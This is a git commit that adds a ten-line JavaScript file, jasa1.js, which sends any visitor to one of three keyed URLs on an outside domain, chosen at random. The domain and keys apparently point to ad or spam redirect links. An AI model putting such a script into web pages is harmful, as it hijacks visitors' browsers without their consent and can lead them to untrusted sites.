2ffb7abb1f7062affd322f2412c592000c79c8bd
mahdi8844 <84512629+mahdi8844@users.noreply.github.com>
2021-10-30 09:21:04 +0800

    Create jasa1.js

---
+++ jasa1.js
@@ -0,0 +1,10 @@
+
+var dataUrl = [
+  
+  'https://accusationcollegeload.com/hpf2wcm4?key=e60866539394fcb1d524ec2677eb5173',
+  'https://accusationcollegeload.com/mvffv3wtan?key=9fd2018daddabecf48cef6b26570d94c',
+  'https://accusationcollegeload.com/n5q1d7fqv6?key=eee8425f3fe6abdd275d14e94b4c920b'
+
+];
+var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
+window.location = randomItem;
